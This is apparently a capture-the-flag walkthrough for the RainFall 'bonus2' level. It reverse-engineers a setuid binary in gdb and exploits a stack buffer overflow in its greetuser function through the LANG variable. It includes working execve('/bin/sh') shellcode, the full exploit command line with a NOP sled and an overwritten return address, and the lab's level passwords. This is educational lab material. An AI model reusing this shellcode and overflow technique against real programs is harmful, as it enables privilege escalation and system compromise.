#+title: Walkthrough
* Access
#+begin_src shell
bonus1@RainFall:~$ su bonus2
Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
#+end_src
* Data Gathering:
** Sticky bit
#+begin_src shell
ls -lhtr 
total 8.0K
-rwsr-s---+ 1 bonus3 users 5.6K Mar  6  2016 bonus2
#+end_src
** String
#+begin_src shell
readelf -p .rodata $USER

String dump of section '.rodata':
  [     8]  Hello 
  [     f]  Hyv<0xc3><0xa4><0xc3><0xa4> p<0xc3><0xa4>iv
  [    22]  Goedemiddag! 
  [    30]  LANG
  [    35]  fi
  [    38]  nl
#+end_src
** Functions
#+begin_src shell
info functions @plt
All functions matching regular expression "@plt":

Non-debugging symbols:
0x08048360  memcmp@plt -> overflow n -> is bigger than buffer size
0x08048370  strcat@plt -> overflow in not valid string -> strncpy
0x08048380  getenv@plt -> env 
0x08048390  puts@plt   -> print
0x080483c0  strncpy@plt -> not null character in case str >= n
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048484  greetuser 
0x08048529  main
#+end_src
** Global vars
#+begin_src shell
info var
All defined variables:
Non-debugging symbols:
0x08049988  language
#+end_src
* Binary Analisys
** Functions
#+begin_src shell
disass greetuser
Dump of assembler code for function greetuser:
   0x08048484 <+0>:	push   ebp
   0x08048485 <+1>:	mov    ebp,esp
   0x08048487 <+3>:	sub    esp,0x58 -> 88 B
   0x0804848a <+6>:	mov    eax,ds:0x8049988 -> global var 
   0x0804848f <+11>:	cmp    eax,0x1 -> is 'fi'
   0x08048492 <+14>:	je     0x80484ba <greetuser+54> -> yes jmp 
   0x08048494 <+16>:	cmp    eax,0x2  -> is 'nl'
   0x08048497 <+19>:	je     0x80484e9 <greetuser+101> -> yes jmp 
   0x08048499 <+21>:	test   eax,eax  -> is zero
   0x0804849b <+23>:	jne    0x804850a <greetuser+134> -> yes concat
   0x0804849d <+25>:	mov    edx,0x8048710 -> "Hello "
   0x080484a2 <+30>:	lea    eax,[ebp-0x48] -> buffer of 72 B
   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]
   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx -> copy 'Hell' as a DWORD
   0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4] move ptr
   0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx -> copy 'o ' as a WORD
   0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6]-> copy '\0' as a Byte
   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl
   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
   0x080484ba <+54>:	mov    edx,0x8048717
   0x080484bf <+59>:	lea    eax,[ebp-0x48]
   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
   0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
   0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
   0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
   0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
   0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
   0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
   0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
   0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
   0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl
   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:	mov    edx,0x804872a
   0x080484ee <+106>:	lea    eax,[ebp-0x48]
   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
   0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
   0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
   0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
   0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
   0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx
   0x08048509 <+133>:	nop
   0x0804850a <+134>:	lea    eax,[ebp+0x8] -> param
   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax -> param 2
   0x08048511 <+141>:	lea    eax,[ebp-0x48] -> buffer "Hello "
   0x08048514 <+144>:	mov    DWORD PTR [esp],eax -> param1
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
   0x0804851c <+152>:	lea    eax,[ebp-0x48] -> buffer "Hello " + param
   0x0804851f <+155>:	mov    DWORD PTR [esp],eax  -> param 1
   0x08048522 <+158>:	call   0x8048390 <puts@plt>  print
   0x08048527 <+163>:	leave  
   0x08048528 <+164>:	ret    
(gdb) p (char *)0x8048710
$6 = 0x8048710 "Hello " 
(gdb) p (char *)0x8048717
$7 = 0x8048717 "Hyv√§√§ p√§iv√§√§ "
(gdb) p (char *)0x804872a
$8 = 0x804872a "Goedemiddag! "
#+end_src
*** Remember
rep stos is a repeating store  instruction:  

    eax holds the value to store (0).  
    edi is the destination address.  
    ecx (19) is the count of DWORDs (4 bytes each) to store.
     
    #+begin_src shell
(gdb) disass main
Dump of assembler code for function main:
   0x08048529 <+0>:	push   ebp
   0x0804852a <+1>:	mov    ebp,esp       -> stack frame
   0x0804852c <+3>:	push   edi
   0x0804852d <+4>:	push   esi
   0x0804852e <+5>:	push   ebx
   0x0804852f <+6>:	and    esp,0xfffffff0 -> stack align
   0x08048532 <+9>:	sub    esp,0xa0       -> local vars 160 B 
   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3 -> num args == 3
   0x0804853c <+19>:	je     0x8048548 <main+31> -> continue
   0x0804853e <+21>:	mov    eax,0x1             -> else error
   0x08048543 <+26>:	jmp    0x8048630 <main+263> -> jmp return main
   0x08048548 <+31>:	lea    ebx,[esp+0x50] -> buffer esp + 80 B
   0x0804854c <+35>:	mov    eax,0x0        -> '\0'
   0x08048551 <+40>:	mov    edx,0x13       -> 19 * 4 B = 76 B length buff
   0x08048556 <+45>:	mov    edi,ebx
   0x08048558 <+47>:	mov    ecx,edx
   0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax -> fill with '\0' a buffer of length 76
   0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc] -> argv
   0x0804855f <+54>:	add    eax,0x4                 -> &argv[1]
   0x08048562 <+57>:	mov    eax,DWORD PTR [eax]     -> argv[1]
   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28 -> param strncpy n = 40 
   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax  -> param strncpy src = argv[1]
   0x08048570 <+71>:	lea    eax,[esp+0x50]           -> param strncpy dst = fill '\0' buff 76 B
   0x08048574 <+75>:	mov    DWORD PTR [esp],eax      
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>  -> call # with a string of 40 not could abuse of not null cause is fill with '\0' until 76 B
   0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc]  -> argv
   0x0804857f <+86>:	add    eax,0x8                  -> &argv[2]
   0x08048582 <+89>:	mov    eax,DWORD PTR [eax]      -> argv[2]
   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20 -> 32 B
   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax  -> argv[2] src
   0x08048590 <+103>:	lea    eax,[esp+0x50]           -> buffer write before
   0x08048594 <+107>:	add    eax,0x28                 -> move 40 B the writed as Max before
   0x08048597 <+110>:	mov    DWORD PTR [esp],eax      -> strncpy dst
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>  -> call  -> exploitable huge size an the buffer is moved.
   0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738 -> "LANG"
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>    
   0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax 
   0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0  if getenv ret Null
   0x080485ba <+145>:	je     0x8048618 <main+239> jmp error
   0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2 param size_t n
   0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d -> param 2 memcmp -> "fi"
   0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c] -> return getenv
   0x080485d3 <+170>:	mov    DWORD PTR [esp],eax -> param 1 memcmp
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt> -> call
   0x080485db <+178>:	test   eax,eax
   0x080485dd <+180>:	jne    0x80485eb <main+194> -> return memcmp ! 0 continue
   0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1 -> global|extern .. var
   0x080485e9 <+192>:	jmp    0x8048618 <main+239>  -> return greet user
   0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2 -> param n memcmp 2
   0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740 -> param 2 "nl" 
   0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c] -> return getenv
   0x08048602 <+217>:	mov    DWORD PTR [esp],eax -> param 1
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>call
   0x0804860a <+225>:	test   eax,eax
   0x0804860c <+227>:	jne    0x8048618 <main+239> -> same check
   0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2
   0x08048618 <+239>:	mov    edx,esp
   0x0804861a <+241>:	lea    ebx,[esp+0x50]
   0x0804861e <+245>:	mov    eax,0x13
   0x08048623 <+250>:	mov    edi,edx
   0x08048625 <+252>:	mov    esi,ebx
   0x08048627 <+254>:	mov    ecx,eax
   0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi] cp buffer[76] to 
   0x0804862b <+258>:	call   0x8048484 <greetuser> -> call to greetuser
   0x08048630 <+263>:	lea    esp,[ebp-0xc]
   0x08048633 <+266>:	pop    ebx
   0x08048634 <+267>:	pop    esi
   0x08048635 <+268>:	pop    edi
   0x08048636 <+269>:	pop    ebp
   0x08048637 <+270>:	ret    
End of assembler dump.
    #+end_src

rep movs DWORD PTR es:[edi], DWORD PTR ds:[esi]    

#+begin_src shell
    Repeating move operation:             buffer[76]
        Copies 19 DWORDs (76 bytes)  from the source (esi = esp + 0x50) to the destination (edi = esp).  
        After each copy, both pointers (esi and edi) are incremented by 4 bytes  (since its a DWORD move).
#+end_src
** Source
[[source]]
** Exploit Estrategy
*** modify return greetuser.
try to overflow buffer of greetuser for modify the return va. 
**** Get the offset
#+begin_src shell :tangle no
  Breakpoint 2, 0x08048514 in greetuser ()
  (gdb) x/s $eax
  0xbffffb50:	 "Hello "
  (gdb) x/a $ebp + 4
  0xbffffb9c:	0x8048630 <main+263>
  p/d ($ebp + 4) - $eax
  $4 = 76
#+end_src
***** Verify the alteration of return va.
  Math
#+begin_src quote
  76 < 73 + string_len # Last char '\0' Don't full ctrl.

  76 + 4 (sizeof(va)) < 73 + string_len
  [     8]  Hello 
  [     f]  Hyv<0xc3><0xa4><0xc3><0xa4> p<0xc3><0xa4>iv
  [    22]  Goedemiddag! 
  [    30]
  p (0xf-8) - 1 # reach the null char not the next char.
"Hello ".len() = 6
p (0x22-0xf) -1
"Hyv<0xc3><0xa4><0xc3><0xa4> p<0xc3><0xa4>iv ".len() = 18
p (0x30-0x22) -1
"Goedemiddag! ".len() = 13
  Hello
  80 < 79 if we want full ctrl is 78 
  76 - 6 = 70
  70 - 40 = 30
  30 <= 32 offset in argv[2] 
  Hyv<0xc3><0xa4><0xc3><0xa4> p<0xc3><0xa4>iv 
  80 < 18 + 73
  76 - 18 = 58
  58 - 40 (argv[1])
  18 <= 32 offset in argv[2]
  80 < 13 + 73
  Goedemiddag! 
  76 - 13 = 63
  63 - 40 = 23
  23 <= 32 offset in argv[2] 
#+end_src
****** default test 
#+begin_src shell
  x/a $ebp + 4
  0xbffffb5c:	0x8048630 <main+263>
  (gdb) x/i $eip
  => 0x8048514 <greetuser+144>:	mov    %eax,(%esp)
  (gdb) si
  0x08048517 in greetuser ()
  (gdb) x/i $eip
  => 0x8048517 <greetuser+147>:	call   0x8048370 <strcat@plt>
  (gdb) si
  0x08048370 in strcat@plt ()
  (gdb) fin
  Run till exit from #0  0x08048370 in strcat@plt ()
  0x0804851c in greetuser ()
  (gdb) x/a $ebp + 4 #  "\0BB" I am close but i need a large string use env LANG.
    0xbffffb5c:	0x8004242
#+end_src
****** fi test
#+begin_src shell
      unset env LINES 
      unset env COLUMNS
      set env LANG=fi
    show env
    TERM=dumb
    SHELL=/bin/bash
    SSH_CLIENT=10.0.2.2 56016 4242
    SSH_TTY=/dev/pts/0
    USER=bonus2
    LS_COLORS=
    MAIL=/var/mail/bonus2
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
    PWD=/home/user/bonus2
    LANG=fi
    SHLVL=1
    HOME=/home/user/bonus2
    LOGNAME=bonus2
    SSH_CONNECTION=10.0.2.2 56016 10.0.2.15 4242
    LESSOPEN=| /usr/bin/lesspipe %s
    LESSCLOSE=/usr/bin/lesspipe %s %s
    _=/usr/bin/gdb
    OLDPWD=/home/user/bonus2
  (gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAADCBA
(gdb) x/a $ebp+4
0xbffffb7c:	0x41424344
x/s $eax

0xbffffb30:	 "Hyv√§√§ p√§iv√§√§ ", 'A' <repeats 58 times>, "DCBA"

#+end_src

****** nl test
#+begin_src shell
unset env LINES 
unset env COLUMNS
set env LANG=nl
show env
TERM=dumb
SHELL=/bin/bash
SSH_CLIENT=10.0.2.2 56016 4242
SSH_TTY=/dev/pts/0
USER=bonus2
LS_COLORS=
MAIL=/var/mail/bonus2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
PWD=/home/user/bonus2
LANG="nl"
SHLVL=1
HOME=/home/user/bonus2
LOGNAME=bonus2
SSH_CONNECTION=10.0.2.2 56016 10.0.2.15 4242
LESSOPEN=| /usr/bin/lesspipe %s
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/gdb
OLDPWD=/home/user/bonus2
r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBDCBA
Breakpoint 1, 0xb7ebb7c0 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) fin
Run till exit from #0  0xb7ebb7c0 in ?? () from /lib/i386-linux-gnu/libc.so.6
0x0804851c in greetuser ()
(gdb) x/a $ebp+4
0xbffffb7c:	0x41424344

#+end_src
*** Where to aim that return va
 we don't got any system.
 we gonna use a ~shellcode~
 shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
**** Where is storage:
There different ways:
1. we could use username (argv[1] part first 40B) in whatever scenario watch out gdb env vars change stack va's.
2. in case fi and nl we can also use argv[2] the payload is 23B
3. Use an env var.
***** Verify use argv[1]
#+begin_src shell
  r $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xc0"[::-1]')
  Starting program: /home/user/bonus2/bonus2 $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xc0"[::-1]')

  Breakpoint 2, 0x08048574 in main ()
  (gdb) x/s $eax
  0xbffffbc0:	 ""
  (gdb) c
  Continuing.

  Breakpoint 1, 0xb7ebb7c0 in ?? () from /lib/i386-linux-gnu/libc.so.6
  (gdb) x/a $ebp+4
  0xbffffb6c:	0x8048630 <main+263>
  (gdb) fin
  Run till exit from #0  0xb7ebb7c0 in ?? () from /lib/i386-linux-gnu/libc.so.6
  0x0804851c in greetuser ()
  (gdb) x/a $ebp+4
  0xbffffb6c:	0xbffffbc0
  (gdb) c
  Continuing.
  Hyv√§√§ p√§iv√§√§ êêêêêêêêêêêêêêêêê1¿Ph//shh/binâ„PSâ·∞ÕÄBBBBBBBBBBBBBBBBBB¿˚ˇø
  process 2701 is executing new program: /bin/dash
  /bin//sh: relocation error: /bin//sh: symbol scntrl, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
  [Inferior 1 (process 2701) exited with code 0177]
  # weird gdb error i could once but not twice, give an error but i could use system or run the /bin/dash normally.
#+end_src
[40B                                       ] = argv[1]
"sled(nops) + shellcode"
[32B Max              ]  = argv[2]
"sled(offset)+va"



* Exploit

      I need to guest the stack va of main buffer i will add 0x10 to gdb until success.

** try and error
#+begin_src shell
      ./$USER $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xc0"[::-1]')
      Hyv√§√§ p√§iv√§√§ êêêêêêêêêêêêêêêêê1¿Ph//shh/binâ„PSâ·∞ÕÄBBBBBBBBBBBBBBBBBB¿˚ˇø
      Segmentation fault (core dumped)
    #0xd0
        ./$USER $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xd0"[::-1]')
        Hyv√§√§ p√§iv√§√§ êêêêêêêêêêêêêêêêê1¿Ph//shh/binâ„PSâ·∞ÕÄBBBBBBBBBBBBBBBBBB–˚ˇø
        Segmentation fault (core dumped)
#+end_src
** Sucessful one
#+begin_src shell

          ./$USER $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xe0"[::-1]')

  $ id
  uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
  $ whoami
  bonus3
  $ cat /home/user/`whoami`/.pass
  71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

#+end_src
